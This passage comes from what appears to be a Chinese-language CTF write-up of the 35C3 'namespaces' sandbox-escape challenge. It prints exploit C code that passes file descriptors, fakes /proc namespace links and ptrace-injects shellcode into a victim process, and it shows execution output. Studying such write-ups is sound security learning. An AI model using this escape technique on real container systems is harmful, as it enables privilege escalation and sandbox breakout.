class="type">int</span> conn)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Preparing for receive&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> io_buf[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123;.iov_base = io_buf, .iov_len = <span class="keyword">sizeof</span> io_buf&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> buf[CMSG_SPACE(<span class="keyword">sizeof</span> fd)];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> <span class="title">align</span>;</span></span><br><span class="line">    &#125; u;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;u, <span class="number">0</span>, <span class="keyword">sizeof</span> u);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    msg.msg_iov = &amp;io;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    msg.msg_control = u.buf;</span><br><span class="line">    msg.msg_controllen = <span class="keyword">sizeof</span> u.buf;</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Receiving fd&quot;</span>);</span><br><span class="line">    CHECK_CALL(recvmsg, conn, &amp;msg, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Extracting fd&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span> =</span> CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsg), <span class="keyword">sizeof</span> fd);</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后便是最重要的逃逸部分代码，这里只放一些关键代码，首先先检测是否可以访问&#x2F;proc文件夹，也就是看一下是否逃逸成功到&#x2F;目录，之后创建子进程，并且通过set_trap_for_join来进行mnt操作，首先就是把proc放到一个新的目录下，并且创建一个新的&#x2F;proc目录，让新的&#x2F;proc&#x2F;父进程pid&#x2F;ns&#x2F;pid指向原来子进程的pid namespace，这样后面run_elf的时候就会和子进程一个pid namespace了，之后就是把uts namespace创建成fifo用来阻塞，提高成功率，之后就是不断的利用ptrace进行检测是否有新的进程加入，这里需要注意的是因为创建的是一个新进程，所以这里直接检测pid为2就可以了，之后注入shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_escalate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Checking that we won the race&quot;</span>);</span><br><span class="line">    CHECK_CALL(access, <span class="string">&quot;/proc&quot;</span>, F_OK);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> init = get_cur_pid();</span><br><span class="line">    info(<span class="string">&quot;Init pid: %d&quot;</span>, init);</span><br><span class="line">    </span><br><span class="line">    new_namespaces();</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Forking&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (CHECK_CALL(fork)) &#123;</span><br><span class="line">        info(<span class="string">&quot;Parent done&quot;</span>);</span><br><span class="line">        do_sleep();</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;Child started&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> child = get_cur_pid();</span><br><span class="line">    info(<span class="string">&quot;Child pid: %d&quot;</span>, child);</span><br><span class="line">    </span><br><span class="line">    set_trap_for_join(init, child);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Waiting for victim to join&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (ptrace(PTRACE_ATTACH, <span class="number">2</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;Attached to victim&quot;</span>);</span><br><span class="line">    CHECK_CALL(waitpid, <span class="number">2</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Reading rip&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    xptrace(PTRACE_GETREGS, <span class="number">2</span>, <span class="number">0</span>, (<span class="type">uintptr_t</span>)&amp;regs);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Writing shellcode to %p&quot;</span>, regs.rip);</span><br><span class="line">    <span class="type">uint8_t</span> shellcode[] = &#123;SHELLCODE&#125;;</span><br><span class="line">    ptrace_write(<span class="number">2</span>, regs.rip, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Detaching&quot;</span>);</span><br><span class="line">    xptrace(PTRACE_DETACH, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Opening fifo&quot;</span>);</span><br><span class="line">    DECL_STR(fifo, <span class="string">&quot;/proc/%d/ns/uts&quot;</span>, init)</span><br><span class="line">    CHECK_CALL(open, fifo, O_WRONLY);</span><br><span class="line">    </span><br><span class="line">    do_sleep();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_trap_for_join</span><span class="params">(<span class="type">int</span> init_pid, <span class="type">int</span> child_pid)</span> &#123;</span><br><span class="line">    makedir(<span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND));</span><br><span class="line">    bindmount(<span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND));</span><br><span class="line">    makedir(<span class="string">&quot;/tmp/newproc_&quot;</span> STR(RAND));</span><br><span class="line">    bindmount(<span class="string">&quot;/tmp/newproc_&quot;</span> STR(RAND), <span class="string">&quot;/proc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DECL_STR(dir1, <span class="string">&quot;/proc/%d&quot;</span>, init_pid)</span><br><span class="line">    makedir(dir1);</span><br><span class="line">    DECL_STR(dir2, <span class="string">&quot;/proc/%d/ns&quot;</span>, init_pid)</span><br><span class="line">    makedir(dir2);</span><br><span class="line"></span><br><span class="line">    DECL_STR(linkpath, <span class="string">&quot;/proc/%d/ns/pid&quot;</span>, init_pid)</span><br><span class="line">    DECL_STR(target, <span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND) <span class="string">&quot;/%d/ns/pid&quot;</span>, child_pid)</span><br><span class="line">    info(<span class="string">&quot;Linking pid ns \&quot;%s\&quot; -&gt; \&quot;%s\&quot;&quot;</span>, linkpath, target);</span><br><span class="line">    CHECK_CALL(symlink, target, linkpath);</span><br><span class="line"></span><br><span class="line">    DECL_STR(fifo, <span class="string">&quot;/proc/%d/ns/uts&quot;</span>, init_pid)</span><br><span class="line">    info(<span class="string">&quot;Creating fifo \&quot;%s\&quot;&quot;</span>, fifo);</span><br><span class="line">    CHECK_CALL(mkfifo, fifo, <span class="number">0755</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	自此代码的逻辑就分析完了，这里贴一下简单的执行流程，根据这个流程执行最终就会把sandbox2的进程读取flag并且输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting sandbox: sleep</span><br><span class="line">[+] Starting sandbox: sleep</span><br><span class="line">[+] Running in sandbox #0: sendfd</span><br><span class="line">[+] Running in sandbox #1: recvfd</span><br><span class="line">[+] Starting sandbox: escalate</span><br><span class="line">[+] Running in sandbox #2: sleep</span><br></pre></td></tr></table></figure>

<p>​	由于篇幅原因，需要exp的可以直接访问<a target="_blank" rel="noopener" href="https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces">链接</a>来进行获取</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	由于这个是我复现的容器逃逸的第一个题目，其中很多思想之前并没有接触过，因此复现的过程也比较详细，中间也踩过不少的坑，通过这个文章可以很清楚的复现对应赛题，感觉通过这个题目对于容器有了进一步的了解，希望可以通过后面的学习不断的加深对于容器以及docker原理的学习和漏洞复现</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">a2ure</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">4</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">a2ure</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">14k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">50 mins.</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
